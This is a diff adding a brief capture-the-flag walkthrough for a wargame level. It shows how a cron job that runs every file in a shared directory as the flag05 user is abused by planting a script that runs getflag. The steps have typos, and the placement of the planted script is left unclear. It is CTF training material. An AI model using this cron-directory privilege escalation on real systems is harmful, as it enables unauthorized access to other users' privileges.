@@ -1,0 +1,22 @@
+1. login as level05 => "You have a new email"
+
+2. cat /var/mail/level05 and we get:
+		*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
+	This is a cron job every 2mn. executing openarenaserver script with flag 05 permissions in a login sheel (a subprocess)
+
+3. cat /usr/sbin/openarenaser. we get :
+		#!/bin/sh
+
+		for i in /opt/openarenaserver/* ; do
+			(ulimit -t 5; bash -x "$i")
+			rm -f "$i"
+		done
+		
+	It tries to execute every file in the /opt/openarenaserver directory and then delete it 
+	Hence we haveve to create a script that will be executed by the script with the flag05 permissions 
+
+4. echo "getflag > /tmp/flag05" > script.sh
+	we need to create the file in tmp as it is a shared directory 
+
+5. cat /tmp/flag05 -> here you go!
+
